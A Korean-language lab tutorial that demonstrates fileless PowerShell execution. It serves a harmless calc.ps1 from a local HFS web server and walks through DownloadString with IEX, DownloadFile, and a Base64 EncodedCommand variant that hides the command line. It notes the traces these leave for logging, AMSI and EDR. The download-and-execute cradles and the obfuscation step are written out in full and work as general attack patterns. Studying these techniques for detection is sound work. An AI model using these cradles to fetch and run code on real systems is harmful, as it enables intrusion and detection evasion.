## DownloadString·IEX·Fileless 실행 실습

### 원격 다운로드 3가지 방식

* 실제 침해사고에서 `DownloadString + IEX` 조합은 파일을 디스크에 저장하지 않고 원격 PowerShell 코드를 실행하는 대표적인 패턴으로 관찰된다.

| 함수 | 동작 | 파일리스 여부 |
|---|---|---|
| `DownloadString()` | 원격 코드를 문자열로 반환 → `IEX`로 즉시 실행 가능 | 가능(메모리에서 처리) |
| `DownloadFile()` | 원격 파일을 지정된 경로에 저장한 후 별도로 실행 | 불가능(디스크 저장) |
| `Invoke-WebRequest(iwr)` | HTTP 요청으로 리소스에 접근하며, 저장하거나 응답 내용을 변수로 처리하는 등 다양한 방식으로 사용할 수 있음 | 사용 방식에 따라 다름 |

### IEX 파일리스 실행 원리

* `IEX(Invoke-Expression)`는 문자열을 PowerShell 코드로 해석하여 실행하는 명령이다.
  - `WebClient.DownloadString`이 원격 스크립트를 문자열로 받아온다.
  - `IEX`가 해당 문자열을 PowerShell 코드로 해석하여 실행한다.
  - 이 과정에서는 다운로드한 스크립트를 별도의 파일로 저장하지 않고 메모리에서 처리할 수 있다.
  - 따라서 `DownloadFile()`처럼 다운로드한 `.ps1` 파일이 디스크에 생성되는 방식과 달리 파일 기반 탐지를 어렵게 만들 수 있다.
  - 다만 파일이 생성되지 않는다고 해서 시스템에 아무런 흔적도 남지 않는 것은 아니다. PowerShell 로깅, AMSI, EDR, 네트워크 로그 등에서 실행 및 통신 흔적이 확인될 수 있다.

```bash
# 대표적인파일리스실행패턴
IEX (New-Object Net.WebClient).DownloadString('http://server/a.ps1')
```

### 실습 환경 준비 - HFS

* HFS(HTTP File Server)는 Rejetto가 만든 무료 Windows용 간이 웹 서버로, 폴더의 파일을 HTTP를 통해 공유할 수 있다.
  - 왼쪽 패널에 공유할 파일을 드래그하면 HTTP를 통해 접근할 수 있도록 설정할 수 있다.
  - 상단에 표시되는 IP·포트 주소가 실습에서 사용할 URL이 된다.

<img width="1358" height="808" alt="image" src="https://github.com/user-attachments/assets/e3df1c4b-b1f9-4098-81b1-1838933f1414" />

### 실습 1 - calc.ps1 스크립트 제작

* 계산기를 실행하는 간단한 PowerShell 스크립트를 만들어 실습 폴더에 저장한다.
* ISE에서 아래 코드를 입력한 뒤 `C:\Users\asd\Desktop\practice\powershell\calc.ps1`로 저장한다.

```bash
# calc.ps1
Start-Process calc.exe
```

* HFS를 실행하고 `calc.ps1` 파일을 왼쪽 패널에 드래그하여 공유한다.
* 이후 실습에서는 HFS에서 제공하는 URL을 사용해 원격 다운로드를 재현한다.

<img width="1111" height="469" alt="image" src="https://github.com/user-attachments/assets/80abbe31-28a4-4cf2-a747-722fb4f62ab8" />

### 실습 2 - DownloadString+IEX(파일리스)

* `DownloadString`으로 코드를 문자열로 받아 파일 저장 없이 곧바로 실행한다.
  - URL의 `<HFS-주소>` 부분에 실제 HFS가 표시한 IP·포트를 입력한다.
  - 이 한 줄을 ISE 콘솔에 입력하고 엔터를 누르면 계산기가 실행된다.
  - `calc.ps1` 자체는 다운로드 대상이지만 로컬 디스크에 별도의 파일로 저장하지 않고 문자열 형태로 처리한다.
  - 따라서 실습 폴더나 `%TEMP%` 등에 `calc.ps1` 사본이 생성되지 않는 것을 확인할 수 있다.
  - 단, 파일이 생성되지 않는 것과 실행 흔적이 전혀 남지 않는 것은 구분해야 한다.

```bash
IEX (New-Object Net.WebClient).DownloadString('http://<HFS-주소>/calc.ps1')
```

* 계산기 실행을 확인한다.

<img width="1102" height="606" alt="image" src="https://github.com/user-attachments/assets/f168024a-0321-4007-ba40-2efc00ea7c50" />

### 실습 3 - DownloadFile (디스크 저장 후 실행)

* `DownloadFile`은 원격 파일을 지정된 경로에 저장한 뒤 별도로 실행하는 방식이다.
  - 첫 번째 인자는 다운로드할 URL이고, 두 번째 인자는 저장 경로이다.
  - 저장이 완료된 후 별도로 `powershell.exe`를 사용하여 파일을 실행한다.
* 이전 실습과 달리 디스크에 파일이 남으므로 파일리스 실행이 아니다.

```bash
(New-Object Net.WebClient).DownloadFile(
  'http://<HFS-주소>/calc.ps1',
  'C:\Users\Public\Downloads\calc.ps1')

powershell.exe -File C:\Users\Public\Downloads\calc.ps1
```

* PowerShell ISE에서 해당 코드를 입력한 후 상단의 화살표를 클릭하여 스크립트를 실행하면 이전과 동일하게 계산기가 실행되는 것을 확인할 수 있다.
* 그러나 이전 실습과 달리 `C:\Users\Public\Downloads` 폴더에 `calc.ps1` 파일이 생성된 것을 확인할 수 있다.

* 계산기 실행 및 해당 경로로 다운로드된 파일을 확인한다.

<img width="1124" height="853" alt="image" src="https://github.com/user-attachments/assets/f19bab92-711d-4ce8-8fc3-7f7351a4e942" />

### 실습 4 - Base64 + EncodedCommand 조합

* 실습 2의 명령을 UTF-16LE Base64로 인코딩하여 `EncodedCommand`로 실행한다.
  - 실행 명령 문자열이 Base64로 변환되어 명령줄에서 원래 문자열이 직접 보이지 않게 할 수 있다.
  - 동시에 원격 스크립트를 `DownloadString + IEX` 방식으로 처리하므로 다운로드한 스크립트를 별도 파일로 저장하지 않는 실행 방식을 유지할 수 있다.
  - Base64는 암호화가 아닌 인코딩이므로 보안 제품은 디코딩된 명령이나 실행 행위 등을 통해 탐지할 수 있다.
  - `EncodedCommand` 자체도 PowerShell 공격에서 관찰되는 대표적인 명령 실행 방식 중 하나이다.

```bash
# 인코딩
$cmd = 'IEX (New-Object Net.WebClient).DownloadString(''http://<HFS-주소>/calc.ps1'')'
$b64 = [Convert]::ToBase64String(
  [System.Text.Encoding]::Unicode.GetBytes($cmd))

# 실행
powershell.exe -EncodedCommand $b64
```

* 계산기 실행을 확인한다.

<img width="1099" height="791" alt="image" src="https://github.com/user-attachments/assets/c489c02c-2c08-4378-b425-3682d26be577" />

